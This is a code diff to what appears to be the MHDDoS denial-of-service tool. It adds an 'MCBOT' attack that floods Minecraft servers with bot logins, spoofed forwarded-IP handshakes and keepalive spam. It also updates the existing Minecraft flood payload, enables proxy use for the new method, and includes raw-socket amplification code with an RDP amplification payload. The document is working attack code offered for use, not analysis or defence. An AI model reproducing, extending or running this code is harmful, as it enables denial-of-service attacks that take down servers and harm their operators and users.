@@ -15,6 +15,7 @@ from socket import (AF_INET, IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, IPPROTO_UDP, S
                     SOCK_RAW, SOCK_STREAM, TCP_NODELAY, gethostbyname,
                     gethostname, socket)
 from ssl import CERT_NONE, SSLContext, create_default_context
+from struct import pack as data_pack
 from subprocess import run
 from sys import argv
 from sys import exit as _exit
@@ -22,12 +23,13 @@ from threading import Event, Lock, Thread
 from time import sleep, time
 from typing import Any, List, Set, Tuple
 from urllib import parse
+from uuid import UUID, uuid4
 
-import dns.resolver
 from PyRoxy import Proxy, ProxyChecker, ProxyType, ProxyUtiles
 from PyRoxy import Tools as ProxyTools
 from certifi import where
 from cfscrape import create_scraper
+from dns import resolver
 from icmplib import ping
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import cpu_percent, net_io_counters, process_iter, virtual_memory
@@ -82,7 +84,7 @@ class Methods:
 
     LAYER4_METHODS: Set[str] = {
         "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MEM", "NTP", "DNS", "ARD",
-        "CHAR", "RDP"
+        "CHAR", "RDP", "MCBOT"
     }
     ALL_METHODS: Set[str] = {*LAYER4_METHODS, *LAYER7_METHODS}
 
@@ -156,6 +158,62 @@ class Tools:
         return size
 
 
+class Minecraft:
+    @staticmethod
+    def varint(d: int) -> bytes:
+        o = b''
+        while True:
+            b = d & 0x7F
+            d >>= 7
+            o += data_pack("B", b | (0x80 if d > 0 else 0))
+            if d == 0:
+                break
+        return o
+
+    @staticmethod
+    def data(*payload: bytes) -> bytes:
+        payload = b''.join(payload)
+        return Minecraft.varint(len(payload)) + payload
+
+    @staticmethod
+    def short(integer: int) -> bytes:
+        return data_pack('>H', integer)
+
+    @staticmethod
+    def handshake(target: Tuple[str, int], version: int, state: int) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x00),
+                              Minecraft.varint(version),
+                              Minecraft.data(target[0].encode()),
+                              Minecraft.short(target[1]),
+                              Minecraft.varint(state))
+
+    @staticmethod
+    def handshake_forwarded(target: Tuple[str, int], version: int, state: int, ip: str, uuid: UUID) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x00),
+                              Minecraft.varint(version),
+                              Minecraft.data(
+                                  target[0].encode(),
+                                  b"\x00",
+                                  ip.encode(),
+                                  b"\x00",
+                                  uuid.hex.encode()
+                              ),
+                              Minecraft.short(target[1]),
+                              Minecraft.varint(state))
+
+    @staticmethod
+    def login(username: str) -> bytes:
+        if isinstance(username, str):
+            username = username.encode()
+        return Minecraft.data(Minecraft.varint(0x00),
+                              Minecraft.data(username))
+
+    @staticmethod
+    def keepalive(num_id) -> bytes:
+        return Minecraft.data(Minecraft.varint(0x00),
+                              Minecraft.varint(num_id))
+
+
 # noinspection PyBroadException
 class Layer4(Thread):
     _method: str
@@ -204,6 +262,7 @@ class Layer4(Thread):
         if name == "SYN": self.SENT_FLOOD = self.SYN
         if name == "VSE": self.SENT_FLOOD = self.VSE
         if name == "MINECRAFT": self.SENT_FLOOD = self.MINECRAFT
+        if name == "MCBOT": self.SENT_FLOOD = self.MCBOT
         if name == "RDP":
             self._amp_payload = (
                 b'\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00',
@@ -248,7 +307,7 @@ class Layer4(Thread):
 
     def MINECRAFT(self) -> None:
         global bytes_sent, REQUESTS_SENT
-        payload = b'\x0f\x1f0\t' + self._target[0].encode() + b'\x0fA'
+        payload = Minecraft.handshake(self._target, 74, 1)
         try:
             with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
                 s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
@@ -294,11 +353,38 @@ class Layer4(Thread):
         payload = next(self._amp_payloads)
         try:
             with socket(AF_INET, SOCK_RAW,
-                                           IPPROTO_UDP) as s:
+                        IPPROTO_UDP) as s:
                 s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
                 while s.sendto(*payload):
                     REQUESTS_SENT += 1
                     bytes_sent += len(payload[0])
+
+        except Exception:
+            s.close()
+
+    def MCBOT(self) -> None:
+        global bytes_sent, REQUESTS_SENT
+        login = Minecraft.login("MHDDoS_" + ProxyTools.Random.rand_str(5))
+        handshake = Minecraft.handshake_forwarded(self._target,
+                                                  47,
+                                                  2,
+                                                  ProxyTools.Random.rand_ipv4(),
+                                                  uuid4())
+        try:
+            with self.get_effective_socket(AF_INET, SOCK_STREAM) as s:
+                s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+                s.connect(self._target)
+
+                s.send(handshake)
+                s.send(login)
+                bytes_sent += (len(handshake + login))
+                REQUESTS_SENT += 1
+
+                c = 1000
+                while s.recv(1) and c:
+                    c -= 1
+                    s.send(Minecraft.keepalive(randint(1000, 1234567890)))
+                    sleep(0.05)
 
         except Exception:
             s.close()
@@ -1176,13 +1262,13 @@ class ToolsConsole:
     @staticmethod
     def ts_srv(domain):
         records = ['_ts3._udp.', '_tsdns._tcp.']
-        DnsResolver = dns.resolver.Resolver()
+        DnsResolver = resolver.Resolver()
         DnsResolver.timeout = 1
         DnsResolver.lifetime = 1
         Info = {}
         for rec in records:
             try:
-                srv_records = dns.resolver.resolve(rec + domain, 'SRV')
+                srv_records = resolver.resolve(rec + domain, 'SRV')
                 for srv in srv_records:
                     Info[rec] = str(srv.target).rstrip('.') + ':' + str(
                         srv.port)
@@ -1215,7 +1301,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
             )
             Proxies = ProxyChecker.checkAll(
                 Proxies, timeout=1, threads=threads,
-                **({'url': url.human_repr()} if url else {})
+                url=url.human_repr() if url else "https://google.com",
             )
             if not Proxies:
                 exit(
@@ -1286,8 +1372,8 @@ if __name__ == '__main__':
 
                     if method == "BOMB":
                         assert (
-                            bombardier_path.exists()
-                            or bombardier_path.with_suffix('.exe').exists()
+                                bombardier_path.exists()
+                                or bombardier_path.with_suffix('.exe').exists()
                         ), (
                             "Install bombardier: "
                             "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
@@ -1366,7 +1452,7 @@ if __name__ == '__main__':
                                 proxy_ty = int(argfive)
                                 proxy_li = Path(__dir__ / "files/proxies" / argv[6].strip())
                                 proxies = handleProxyList(con, proxy_li, proxy_ty)
-                                if method not in {"MINECRAFT", "TCP"}:
+                                if method not in {"MINECRAFT", "MCBOT", "TCP"}:
                                     exit("this method cannot use for layer4 proxy")
 
                             else:
